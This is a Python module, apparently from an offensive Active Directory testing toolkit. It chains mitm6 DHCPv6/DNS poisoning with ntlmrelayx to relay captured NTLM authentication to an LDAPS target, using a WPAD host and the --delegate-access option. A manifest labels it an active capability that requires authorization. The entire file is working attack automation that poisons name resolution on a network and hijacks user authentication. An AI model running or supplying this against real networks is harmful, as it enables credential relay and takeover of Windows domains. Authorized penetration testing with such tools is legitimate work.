"""mitm6 + relay combo — IPv6 DNS poisoning → WPAD → NTLM relay."""
import subprocess
import sys
import shutil
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.relay.mitm6.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dns_poisoning", "dhcpv6", "ntlm_relay"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001", "T1557.002"],
}


def run(args: Any) -> int:
    domain = args.domain
    relay_target = getattr(args, "relay_target", None)
    interface = getattr(args, "interface", None)

    if not relay_target:
        print("[!] --relay-target required (LDAP/SMB target for relay)", file=sys.stderr)
        return 1

    if not shutil.which("mitm6"):
        print("[!] mitm6 not found — pip install mitm6", file=sys.stderr)
        return 1

    mitm6_cmd = ["mitm6", "-d", domain]
    if interface:
        mitm6_cmd.extend(["-i", interface])

    relay_cmd = [
        "ntlmrelayx.py", "-6", "-smb2support",
        "-t", f"ldaps://{relay_target}",
        "--delegate-access",
        "-wh", f"wpad.{domain}",
    ]

    print("[*] mitm6 + ntlmrelayx combo:")
    print(f"  [1] mitm6: DHCPv6 + DNS poisoning for {domain}")
    print(f"  [2] ntlmrelayx: relay captured auth to {relay_target}")
    print()
    print("[*] mitm6 command: {}".format(" ".join(mitm6_cmd)))
    print("[*] relay command: {}".format(" ".join(relay_cmd)))
    print()
    print("[*] Starting mitm6...")

    try:
        mitm6_proc = subprocess.Popen(mitm6_cmd, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True)
        print(f"[+] mitm6 running (PID {mitm6_proc.pid})")

        print("[*] Starting ntlmrelayx...")
        relay_proc = subprocess.Popen(relay_cmd, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True)
        print(f"[+] ntlmrelayx running (PID {relay_proc.pid})")

        print("[*] Both running — waiting for captured auth...")
        for line in relay_proc.stdout:
            print(f"  [relay] {line.rstrip()}")
            if "authenticat" in line.lower():
                break

        return 0
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        return 0
    except Exception as exc:
        print(f"[-] mitm6 relay error: {exc}", file=sys.stderr)
        return 1
